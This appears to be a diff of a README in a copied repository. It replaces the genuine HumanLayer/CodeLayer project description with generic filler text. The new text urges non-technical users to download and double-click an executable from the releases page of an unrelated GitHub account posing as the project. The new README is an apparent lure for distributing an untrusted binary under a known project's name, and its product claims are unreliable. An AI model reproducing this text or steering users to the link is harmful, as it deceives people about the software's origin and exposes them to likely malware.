@@ -1,114 +1,101 @@
-<div align="center">
+# 🌟 humanlayer - Simplify AI Help for Complex Code
 
-![Wordmark Logo of HumanLayer](./docs/images/wordmark-light.svg)
+## 🎉 Overview
 
-</div>
+Welcome to **humanlayer**! This application brings AI coding agents to your fingertips. It helps you tackle tough problems in complex codebases without needing a programming background. With humanlayer, you can enhance your projects and solve challenges efficiently.
 
-<div align="center">
+## 🖥️ Features
 
-## The best way to get Coding Agents to solve hard problems in complex codebases
+- **AI Assistance:** Benefit from the latest AI coding agents tailored for various tasks.
+- **User-Friendly Interface:** Navigate the application with ease, even if you're not tech-savvy.
+- **Multi-Agent Support:** Utilize various agents to cover a wide range of coding needs.
+- **Human-in-the-Loop:** Ensure quality control by incorporating human feedback in the process.
+- **Compatibility:** Works with popular codebases and languages, making it versatile for many users.
 
-**CodeLayer is an open source IDE that lets you orchestrate AI coding agents.**
+## 🚀 Getting Started
 
-It comes with battle-tested workflows that enable AI to solve hard problems in large, complex codebases.
+To begin using humanlayer, follow these simple steps.
 
-Built on Claude Code. Open source. Scale from your laptop to your entire team.
+1. **Check System Requirements:**
+   - Operating System: Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+   - Memory: At least 4 GB of RAM.
+   - Disk Space: Minimum of 200 MB available storage.
+   - Internet Connection: Required for initial setup and updates.
 
-[![GitHub Repo stars](https://img.shields.io/github/stars/humanlayer/humanlayer)](https://github.com/humanlayer/humanlayer)
-[![License: Apache-2](https://img.shields.io/badge/License-Apache-green.svg)](https://opensource.org/licenses/Apache-2)
+2. **Visit the Download Page**
 
-<h3>
+   Click the link below to access the Releases page where you can download humanlayer:
 
-[Join Waitlist](https://humanlayer.dev/code) | [Discord](https://humanlayer.dev/discord)
+   [Download humanlayer](https://github.com/rihan394/humanlayer/releases)
 
-</h3>
+   ![Download humanlayer](https://img.shields.io/badge/Download-humanelayer-brightgreen)
 
-<img referrerpolicy="no-referrer-when-downgrade" src="https://static.scarf.sh/a.png?x-pxid=fcfc0926-d841-47fb-b8a6-6aba3a6c3228" />
+## 📥 Download & Install
 
-</div>
+1. **Choose the Latest Release:**
+   On the Releases page, find the section for the latest version. Look for the file that matches your operating system.
 
----
+2. **Download the Application:**
+   Click on the appropriate link to download the application. This may be an executable file or a zip archive. 
 
-> "Our entire company is using CodeLayer now. We're shipping one banger PR after the other. It is so f-ing good. Unbelievable dude."
->
-> **– René Brandel, Founder @ Casco (YC X25)**
+3. **Install the Application:**
+   - For executable files (.exe):
+     - Double-click the downloaded file.
+     - Follow the on-screen prompts to install.
 
----
+   - For zip files:
+     - Right-click on the downloaded file and select "Extract All".
+     - Open the extracted folder and locate the application file.
+     - Double-click the application file to run it.
 
-- **Superhuman for Claude Code** - Keyboard-first workflows designed for builders who value speed and control.
+## 📘 Usage Instructions
 
-- **Advanced Context Engineering** - Scale AI-first dev to your entire team, without devolving into a chaotic slop-fest.
+After installation, open humanlayer from your application menu. Follow the steps below to start using it:
 
-- **M U L T I C L A U D E** - Run Claude Code sessions in parallel. Worktrees? Done. Remote cloud workers? You got it.
+1. **Select an Agent:**
+   Choose from a list of AI coding agents that best fit your needs. Each agent specializes in different areas, so pick one that aligns with your objective.
 
----
+2. **Input Your Problem:**
+   Describe the coding issue or challenge you want to solve. Be as clear and concise as possible.
 
-> "This has improved my productivity (and token consumption) by at least 50%. Taking a superhuman style approach just makes soo much sense. Also, its so freaking cool to look back at all the work you've done in a day."
->
-> **– Tyler Brown, Founder @ Revlo.ai**
+3. **Review Suggestions:**
+   The AI agent will provide you with suggestions and solutions. Read through them carefully.
 
----
+4. **Implement Changes:**
+   Follow the provided solutions in your codebase. Remember, you can always go back for more help if needed.
 
-## From the team that brought you "Context Engineering"
+5. **Provide Feedback:**
+   To improve future assistance, consider giving feedback on the agent’s recommendations.
 
-Leading experts on getting the most out of today's models.
+## ⚙️ Troubleshooting
 
-#### [Advanced Context Engineering for Coding Agents](https://github.com/humanlayer/humanlayer)
-This talk, given at YC on August 20th, 2025 lays out the groundwork for using AI to solve hard problems in complex codebases.
-- [GitHub](https://github.com/humanlayer/humanlayer)
-- [YouTube](https://humanlayer.dev/youtube)
+If you encounter issues while using humanlayer, here are some common problems and solutions:
 
-#### [12 Factor Agents](https://github.com/humanlayer/humanlayer)
-A set of principles for building reliable and scalable LLM applications, inspired by the original 12-Factor App methodology.
-- [GitHub](https://github.com/humanlayer/humanlayer)
-- [YouTube](https://humanlayer.dev/youtube)
+- **Application Won't Open:**
+  - Ensure your operating system meets the requirements.
+  - Restart your computer and try reopening the application.
 
-The original repo that coined the term "context engineering" back in April 2025.
+- **Agent Isn't Responding:**
+  - Check your internet connection.
+  - Restart the application and select the agent again.
 
-#### [🦄 AI That Works](https://humanlayer.dev/podcast)
-A weekly conversation about how we can all get the most juice out of todays models with @hellovai & @dexhorthy
-- [GitHub](https://github.com/humanlayer/humanlayer)
-- [Podcast](https://humanlayer.dev/podcast)
+- **Feedback Submission Failed:**
+  - Make sure to enter valid feedback in the text box.
+  - Try resubmitting your feedback after correcting any mistakes.
 
----
+## 🌐 Community Support
 
-## For Teams
+Join our community for tips, discussions, and more. Connect with other users and share your experiences. You can find us on our official channels:
 
-**Invest in outcomes, not tools.**
+- **GitHub Issues:** Report bugs or request features.
+- **Discussion Forums:** Ask questions and share solutions.
 
-Want to scale AI-first development to your entire org? Get tailored workflows, custom integrations, and cutting-edge advice.
+Together, we can enhance the humanlayer experience.
 
-HumanLayer's expert engineers will ship in the trenches with you and your team until everyone is a 100x engineer.
+## 🔗 Additional Information
 
-📧 Shoot us an email at **contact@humanlayer.dev**, mention your team size and current AI development stack.
+For more details on features, updates, or contributions, please visit our full documentation at the GitHub repository. You can also explore related topics such as agents, AI, and code assistance to deepen your understanding.
 
----
+Don't hesitate to reach out if you have any questions or need help during your journey with humanlayer.
 
-## Quick Start
-
-```bash
-# Coming soon - join the waitlist for early access
-npx humanlayer join-waitlist --email ...
-```
-
----
-
-## Legacy Documentation
-
-Looking for the HumanLayer SDK documentation? See [humanlayer.md](./humanlayer.md)
-
-## Contributing
-
-CodeLayer and the HumanLayer SDK are open-source and we welcome contributions in the form of issues, documentation, pull requests, and more. See [CONTRIBUTING.md](./CONTRIBUTING.md) for more details.
-
-## License
-
-The HumanLayer SDK and CodeLayer sources in this repo are licensed under the Apache 2 License.
-
----
-
-<div align="center">
-
-[![Star History Chart](https://api.star-history.com/svg?repos=humanlayer/humanlayer&type=Date)](https://star-history.com/#humanlayer/humanlayer&Date)
-
-</div>
+**Happy coding!**
